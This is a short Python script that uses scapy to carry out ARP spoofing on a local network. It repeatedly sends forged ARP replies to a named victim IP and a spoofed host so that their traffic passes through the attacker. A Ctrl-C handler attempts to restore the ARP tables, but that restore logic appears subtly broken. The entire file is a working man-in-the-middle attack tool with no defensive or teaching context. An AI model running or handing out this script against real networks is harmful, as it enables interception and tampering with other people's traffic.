#!/usr/bin/env python3

import scapy.all as scapy
import optparse
from time import sleep


def spoof(target_ip, spoof_ip, restore=False):
    spoof_mac = get_mac(spoof_ip)
    target_mac = get_mac(target_ip)
    if restore:
        target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=target_mac)
        spoof_packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=spoof_mac)
    else:
        target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        spoof_packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip)
    packets_counter = 0
    while True:
        scapy.send(target_packet, iface='eth1', verbose=False)
        scapy.send(spoof_packet, iface='eth1', verbose=False)
        if restore:
            exit()
        packets_counter += 2
        print(f'\r[+] Packets sent: {packets_counter}', end='')
        sleep(2)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast/arp_request
    result = scapy.srp(packet, timeout=10, iface='eth1', verbose=False)
    return result[0][0][1].hwsrc


def parse_args():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target / Victim IP address")
    parser.add_option("-s", "--spoof", dest="spoof", help="Spoofed IP address")
    opt, args = parser.parse_args()
    if not opt.target:
        parser.error("[-] Target IP wasn't specified, use --help for more information.")
    elif not opt.spoof:
        parser.error("[-] Spoofed IP wasn't specified, use --help for more information.")
    return opt


opt = parse_args()
try:
    spoof(opt.target, opt.spoof)
except KeyboardInterrupt:
    print("\n[+] KeyboardInterrupt detected, restoring ARP table entries and quitting...")
    spoof(opt.target, opt.spoof, restore=True)
